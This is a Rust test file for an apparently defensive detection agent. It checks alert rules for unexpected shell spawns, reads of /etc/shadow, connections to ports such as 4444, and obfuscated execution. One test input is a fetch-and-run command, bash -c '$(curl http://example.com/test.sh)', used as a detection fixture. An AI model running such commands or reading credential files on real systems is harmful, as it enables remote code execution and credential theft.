use agent::detection;

fn default_shells() -> Vec<String> {
    vec![
        "bash".into(),
        "sh".into(),
        "zsh".into(),
        "fish".into(),
        "dash".into(),
    ]
}

// Verifies unknown launchers spawning a shell produce an unexpected shell-spawn alert.
#[test]
fn suspicious_shell_spawn_alerts_for_unknown_launcher() {
    let safe_launchers = vec!["code".into(), "tmux".into()];
    let shells = default_shells();

    let alert = detection::check_suspicious_shell_spawn(
        "curl",
        "/bin/sh",
        123,
        "curl=>sh",
        &safe_launchers,
        &shells,
    );

    assert!(alert.is_some());
    assert_eq!(alert.unwrap().rule, "T1059 [Unexpected shell spawn]");
}

// Ensures allowlisted launchers do not trigger shell-spawn alerts.
#[test]
fn suspicious_shell_spawn_ignores_safe_launcher() {
    let safe_launchers = vec!["code".into(), "tmux".into()];
    let shells = default_shells();

    let alert = detection::check_suspicious_shell_spawn(
        "code",
        "/bin/bash",
        123,
        "code=>bash",
        &safe_launchers,
        &shells,
    );

    assert!(alert.is_none());
}

// Confirms non-allowlisted processes reading sensitive files trigger alerts.
#[test]
fn sensitive_file_read_alerts_for_non_safe_reader() {
    let safe_readers = vec!["sudo".into(), "sshd".into()];
    let sensitive = vec!["/etc/shadow".into(), "/etc/passwd".into()];

    let alert = detection::check_sensitive_file_read(
        "cat",
        "/etc/shadow",
        7,
        "bash=>cat",
        &safe_readers,
        &sensitive,
    );

    assert!(alert.is_some());
    assert_eq!(alert.unwrap().rule, "T1003 [Sensitive file read]");
}

// Verifies shell connections to loopback are ignored by the network-shell rule.
#[test]
fn shell_network_connection_ignores_localhost() {
    let shells = default_shells();

    let alert = detection::check_shell_network_connection(
        "bash",
        "127.0.0.1",
        4444,
        42,
        "zsh=>bash",
        &shells,
    );

    assert!(alert.is_none());
}

// Checks that known suspicious destination ports trigger the suspicious-port alert.
#[test]
fn suspicious_port_alerts_for_known_bad_port() {
    let alert = detection::check_suspicious_port(
        "curl",
        "8.8.8.8",
        4444,
        42,
        "python=>curl",
        &[4444, 1337],
    );

    assert!(alert.is_some());
    assert_eq!(alert.unwrap().rule, "T1071 [Connection to suspicious port]");
}

// Ensures obfuscated command patterns like curl substitution are detected.
#[test]
fn obfuscated_command_detects_curl_substitution_pattern() {
    let alert = detection::check_obfuscated_command(
        "bash",
        "/usr/bin/bash -c '$(curl http://example.com/test.sh)'",
        42,
        "zsh=>bash",
    );

    assert!(alert.is_some());
    assert_eq!(alert.unwrap().rule, "T1027 [Obfuscated command execution]");
}

// Ensures benign shell commands are not flagged as obfuscated execution.
#[test]
fn obfuscated_command_ignores_benign_shell_command() {
    let alert =
        detection::check_obfuscated_command("bash", "/usr/bin/bash -c echo hello", 42, "zsh=>bash");

    assert!(alert.is_none());
}
